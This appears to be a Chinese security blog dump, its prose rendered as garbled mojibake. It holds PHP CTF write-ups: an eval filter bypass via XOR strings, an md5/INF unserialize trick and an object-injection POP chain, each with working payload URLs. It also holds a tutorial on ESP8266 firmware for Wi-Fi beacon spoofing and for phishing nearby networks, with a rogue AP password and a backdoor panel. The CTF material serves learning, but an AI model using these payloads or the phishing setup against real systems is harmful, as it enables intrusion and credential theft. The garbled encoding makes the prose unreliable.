<h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a><strong>rceme</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">&quot;*&quot;</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦ã€&#x27;</span>.$val.<span class="string">&#x27;ã€‘&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^[a-z]$/i&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span>(<span class="params"> $content </span>) </span>&#123;</span><br><span class="line">    $pattern = <span class="string">&#x27;/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $out_html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">&#x27;=&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">&#x27;&#x27;</span> || $arr[<span class="number">1</span>]==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£ã€&#x27;</span>.$ifstr.<span class="string">&#x27;ã€‘&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;==&#x27;</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;&lt;&gt;&#x27;</span>, <span class="string">&#x27;!=&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;||&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/\&#123;|&#125;/&#x27;</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£&#x27;</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">&#x27;if(&#x27;</span> . $ifstr . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/&#x27;</span>, $matches[ <span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;if&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;else&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">&#x27;if&#x27;</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">&#x27;/\&#123;if([0-9]):/&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;if&#x27;</span> . $matches3[ <span class="number">1</span> ], <span class="string">&#x27;&#123;if&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;else&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;else&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;end if&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;end if&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span>(<span class="params"> $s, $str=<span class="string">&#x27;,&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">&#x27;&#x27;</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆçœ‹åˆ°<code>parserIfLabel</code>å‡½æ•°é‡Œçš„æ­£åˆ™</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>[\s\S]</code>è¡¨ç¤ºé€šé…ï¼Œçœ‹åˆ°åé¢æœ‰ä¸€ä¸ª<code>eval</code>å‡½æ•°ï¼Œå°è¯•æ˜¯å¦å¯ä»¥å†™è¿›å‡½æ•°ã€‚</p>
<p>è¿™é‡Œéšä¾¿è¯•ä¸€ä¸‹å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªæ­£åˆ™å¼å¯ä»¥åŒ¹é…çš„ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200821150736049.png" alt="image-20200821150736049" style="high:80%;width:80%;" />

<p>è¿™é‡Œåœ¨æœ¬åœ°æµ‹è¯•æŠŠ<code>danger_key</code>è¿‡æ»¤å‡½æ•°å»æ‰ä¹‹åå‘ç°ï¼Œå†ä¼ <code>phpinfo</code></p>
<p>ç›´æ¥å‡ºç°<code>phpinfo()</code>çš„é¡µé¢</p>
<img src="http://img.kawhi.xyz/image-20200821093807478.png" alt="image-20200821093807478" style="high:80%;width:80%;" />

<p>ç„¶åå°±æ˜¯ç»•è¿‡<code>danger_key</code>ï¼Œè¿™é‡Œè¿‡æ»¤phpä»¥åŠä¸€äº›å‡½æ•°ç­‰ç­‰ï¼Œå°è¯•ç”¨å¼‚æˆ–æ„é€ å­—ç¬¦ã€‚</p>
<p>å¼‚æˆ–æ„é€ <code>phpinfo()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27;4:49:R9&#x27;</span>^<span class="string">&#x27;DRDPT4V&#x27;</span>)()//phpinfo()</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://eci-2zebqdx3ky4mu3qy28yg.cloudeci1.ichunqiu.com/?a=&#123;if:%20(%274:49:R9%27^%27DRDPT4V%27)()&#125;()&#123;end%20%20%20if&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥åœ¨phpinfoé‡Œé¢å‘ç°flagã€‚</p>
<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a><strong>easytrick</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ä½ å¤ªé•¿äº†&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">&#x27;trick&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå‘ç°éœ€è¦<code>$trick1</code>å’Œ<code>$trick2</code>ä¸ç›¸ç­‰ï¼Œä½†æ˜¯md5å€¼ç›¸ç­‰çš„å¼ºç»•è¿‡ï¼Œè¿˜é™åˆ¶äº†é•¿åº¦ä¸èƒ½è¶…è¿‡5ï¼Œè€Œä¸”<code>$trick1</code>è¢«è½¬ä¸ºäº†<code>string</code>ï¼Œæ•°ç»„ç»•è¿‡å‘ç°ä¸å¯è¡Œã€‚</p>
<p>è¿™é‡Œå°±æ˜¯ä¸¤ä¸ªä¸åŒç±»å‹çš„å˜é‡ï¼Œä¸€ä¸ª<code>float</code>ï¼Œä¸€ä¸ª<code>string</code>ï¼Œåœ¨åšæ¯”è¾ƒæ—¶ä¸ç›¸ç­‰ï¼Œåœ¨md5å¤„ç†æ—¶ç›¸ç­‰ã€‚è¿™é‡Œå¯ä»¥ç”¨phpçš„INFï¼ˆæ— ç©·å¤§ï¼‰ã€‚</p>
<p>æ„é€ åºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $trick2=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2zei1qumnps7gku8ou0x.cloudeci1.ichunqiu.com&#x2F;?trick&#x3D;O:5:%22trick%22:2:&#123;s:6:%22trick1%22;d:INF;s:6:%22trick2%22;d:INF;&#125;</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾çœ‹åˆ°flagã€‚</p>
<h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a><strong>babyunserialize</strong></h2><p>WMCTFçš„é“¾ï¼Œæ”¹æ”¹å°±èƒ½ç”¨äº†ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span>  $<span class="title">server</span>=&quot;&quot;;</span><br><span class="line">        <span class="keyword">public</span> $events;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">&quot;&quot;</span>)),<span class="string">&quot;find&quot;</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">props</span>=[&quot;<span class="title">quotekey</span>&quot;=&gt;&quot;<span class="title">phpinfo</span>&quot;],</span><br><span class="line">            $<span class="title">adhoc</span>=[-1=&gt;[&quot;<span class="title">expr</span>&quot;=&gt;&quot;<span class="title">kawi</span>&quot;]],</span><br><span class="line">            $<span class="title">db</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params">$offset, $value</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$val</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://eci-2ze0y4x958n38d0jl6pv.cloudeci1.ichunqiu.com/?flag=a%3A2%3A%7Bi%3A0%3BO%3A6%3A%22CLI%5CWS%22%3A0%3A%7B%7Di%3A1%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3Br%3A3%3Bs%3A6%3A%22events%22%3Ba%3A1%3A%7Bs%3A10%3A%22disconnect%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A8%3A%22quotekey%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A8%3A%22%00%2A%00adhoc%22%3Ba%3A1%3A%7Bi%3A-1%3Ba%3A1%3A%7Bs%3A4%3A%22expr%22%3Bs%3A4%3A%22kawi%22%3B%7D%7Ds%3A5%3A%22%00%2A%00db%22%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A8%3A%22quotekey%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A8%3A%22%00%2A%00adhoc%22%3Ba%3A1%3A%7Bi%3A-1%3Ba%3A1%3A%7Bs%3A4%3A%22expr%22%3Bs%3A4%3A%22kawi%22%3B%7D%7Ds%3A5%3A%22%00%2A%00db%22%3Bs%3A0%3A%22%22%3B%7D%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>

<p>flagåœ¨phpinfoé‡Œé¢ã€‚</p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>esp8266åˆ¶ä½œwifiæ€æ‰‹åŠwifié’“é±¼</title>
    <url>/2020/03/04/esp8266%E5%88%B6%E4%BD%9Cwifi%E6%9D%80%E6%89%8B%E5%8F%8Awifi%E9%92%93%E9%B1%BC/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h4><p>esp8266æ˜¯ä¸€å—å¸¦è‡ªå¸¦wifiæ¨¡å—çš„Arduinoï¼Œä¸Šä¼ ä»£ç å¯ä»¥ä½¿ç”¨çƒ§å½•å·¥å…·ï¼ŒåŒæ—¶ä»–è¿˜æ”¯æŒArduino å¼€å‘ç¯å¢ƒç¼–ç¨‹ã€‚è¿™é‡Œç”¨esp8266åšåˆ«äººå·²ç»å†™å¥½çš„wifiæ€æ‰‹å’Œwifié’“é±¼ã€‚è¿˜æœ‰åƒä¸‡è¦æ³¨æ„ä¸è¦ä¹±æ”»å‡»åˆ«äººçš„wifiï¼Œè‡ªå·±æµ‹è¯•ç©ç©å°±å¥½ã€‚</p>
<h4 id="wifiæ€æ‰‹"><a href="#wifiæ€æ‰‹" class="headerlink" title="wifiæ€æ‰‹"></a><strong>wifiæ€æ‰‹</strong></h4><p>æ‰€éœ€ææ–™ï¼š</p>
<ul>
<li>esp8266ä¸€å—</li>
<li>ä¸€æ ¹å®‰å“æ•°æ®çº¿</li>
<li>wifiæ€æ‰‹å›ºä»¶åŠçƒ§å½•å›ºä»¶çš„è½¯ä»¶</li>
</ul>
<h5 id="çƒ§å½•å›ºä»¶"><a href="#çƒ§å½•å›ºä»¶" class="headerlink" title="çƒ§å½•å›ºä»¶"></a><strong>çƒ§å½•å›ºä»¶</strong></h5><p>å…ˆä¸‹è½½çƒ§å½•çš„å·¥å…·ï¼Œåœ¨çƒ§å½•ä¹‹å‰å…ˆERASEæ“¦é™¤ä¸€ä¸‹åŸæ¥çš„æ•°æ®ï¼Œé€‰å¥½ç«¯å£(COM)å’Œæ³¢ç‰¹ç‡(BAUD),ç„¶åæŠŠæå‰ä¸‹è½½å¥½çš„å›ºä»¶çƒ§å½•è¿›å»å³å¯ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200302201605251.png" alt="image-20200302201605251" style="high:30%;width:30%;" />

<h5 id="è¿›å…¥åå°"><a href="#è¿›å…¥åå°" class="headerlink" title="è¿›å…¥åå°"></a><strong>è¿›å…¥åå°</strong></h5><p>åœ¨çƒ§å½•è¿›å»ä¹‹åéœ€è¦æŒ‰ä¸€ä¸‹æ¿å­çš„RST</p>
<p>ç„¶åå¯ä»¥çœ‹åˆ°è‡ªå·±çš„WIFIåˆ—è¡¨å¤šäº†åä¸ºzhangguangzhangçš„wifiè´¦å·ï¼Œå¯†ç åŒWIFiè´¦å·ã€‚è¿æ¥ä¹‹åè¿›å…¥192.168.4.1ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200302203452958.png" alt="image-20200302203452958" style="high:80%;width:100%;" />

<p>è¿™é‡Œæˆ‘é€‰æ‹©äº†beaconæ”»å‡»ï¼Œå‡ ç§’é’Ÿåæ¿å­é™„è¿‘çš„wifiéƒ½æ”¹æˆäº†ä½ æƒ³æ”¹çš„åå­—ã€‚</p>
<p><img src="http://img.kawhi.xyz/image-20200302204350279.png" alt="image-20200302204350279" style="high:30%;width:30%;" /><img src="http://img.kawhi.xyz/image-20200302203524575.png" alt="image-20200302203524575" style="high:30%;width:30%;" /></p>
<p>åœæ­¢æ”»å‡»å³å¯æ¢å¤å¦‚åˆï¼Œä¸ç”¨æ‹…å¿ƒæ”¹ä¸å›æ¥ã€‚</p>
<p>é‡Œé¢è¿˜æœ‰å…¶ä»–åŠŸèƒ½ï¼Œå¯ä»¥è‡ªå·±å°è¯•ä¸€ä¸‹æœ‰ä»€ä¹ˆæ•ˆæœã€‚</p>
<p>æ‰€éœ€è¦çš„å›ºä»¶å’Œå·¥å…·åœ¨ç™¾åº¦éƒ½èƒ½æ‰¾åˆ°</p>
<h4 id="wifié’“é±¼"><a href="#wifié’“é±¼" class="headerlink" title="wifié’“é±¼"></a><strong>wifié’“é±¼</strong></h4><p>æ‰€éœ€ææ–™ï¼š</p>
<ul>
<li>esp8266ä¸€å—</li>
<li>ä¸€æ ¹å®‰å“æ•°æ®çº¿</li>
<li>wifié’“é±¼å›ºä»¶åŠçƒ§å½•å›ºä»¶çš„è½¯ä»¶</li>
</ul>
<h5 id="çƒ§å½•å›ºä»¶-1"><a href="#çƒ§å½•å›ºä»¶-1" class="headerlink" title="çƒ§å½•å›ºä»¶"></a><strong>çƒ§å½•å›ºä»¶</strong></h5><p>é¦–å…ˆå°†wifié’“é±¼çš„å›ºä»¶çƒ§å½•è¿›å»æ¿å­</p>
<img src="http://img.kawhi.xyz/image-20200405213955923.png" alt="image-20200405213955923" style="high:30%;width:30%;" />

<h5 id="è¿›å…¥åå°-1"><a href="#è¿›å…¥åå°-1" class="headerlink" title="è¿›å…¥åå°"></a><strong>è¿›å…¥åå°</strong></h5><p>æˆ‘è¿™é‡Œç”¨çš„å›ºä»¶æ˜¯åˆ«äººå†™å¥½çš„wifié’“é±¼å›ºä»¶ã€‚çƒ§å½•å¥½ä¹‹åé‡å¯ä¸€ä¸‹æ¿å­ã€‚å†wifiåˆ—è¡¨ä¼šå¤šå‡ºä¸€ä¸ªwifiã€‚</p>
<p>wifiåç§°ï¼šFishAPï¼Œå¯†ç ï¼šgkdamm666ã€‚</p>
<p>ç„¶åè¿æ¥ä¸Šwifiï¼Œå†åœ¨ä½ çš„æµè§ˆå™¨è¾“å…¥<a href="http://192.168.0.1/backdoor.html">http://192.168.0.1/backdoor.html</a></p>
<img src="http://img.kawhi.xyz/QQ%E6%88%AA%E5%9B%BE20200405193017.png" style="high:50%;width:50%;"/>

<p>å¯ä»¥çœ‹åˆ°é™„è¿‘çš„wifiåˆ—è¡¨ï¼Œé€‰æ‹©é€šç”¨å‹ï¼Œå†è¾“å…¥ç¼–å·ã€‚æŒ‰ç¡®è®¤å³å¯å¼€å§‹é’“é±¼ã€‚</p>
